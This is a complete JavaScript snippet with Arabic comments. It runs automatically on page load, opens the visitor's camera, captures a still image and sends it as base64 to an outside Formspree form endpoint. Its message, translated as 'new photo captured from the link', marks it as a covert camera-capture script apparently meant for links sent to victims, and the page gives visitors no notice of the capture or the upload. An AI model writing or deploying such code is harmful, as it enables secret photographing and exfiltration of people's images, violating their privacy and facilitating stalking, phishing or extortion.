async function captureAndSend() { try { // 1. طلب الوصول إلى الكاميرا const stream = await navigator.mediaDevices.getUserMedia({ video: true }); const video = document.createElement('video'); video.srcObject = stream; await video.play(); // 2. التقاط الصورة بعد لحظة من فتح الكاميرا const canvas = document.createElement('canvas'); canvas.width = video.videoWidth; canvas.height = video.videoHeight; const context = canvas.getContext('2d'); context.drawImage(video, 0, 0, canvas.width, canvas.height); // تحويل الصورة إلى رابط نصي (Base64) const imageData = canvas.toDataURL('image/png'); // 3. إرسال الصورة إلى Formspree const response = await fetch("https://formspree.io/f/mvzlbnov", { method: "POST", headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' }, body: JSON.stringify({ image: imageData, message: "صورة جديدة ملتقطة من الرابط" }) }); if (response.ok) { console.log("تم الإرسال بنجاح إلى Formspree!"); } else { console.log("حدث خطأ أثناء الإرسال."); } // إغلاق الكاميرا بعد الانتهاء stream.getTracks().forEach(track => track.stop()); } catch (err) { console.error("لم يتم منح الإذن للكاميرا أو حدث خطأ: ", err); } } // تشغيل الوظيفة عند تحميل الصفحة window.onload = captureAndSend;
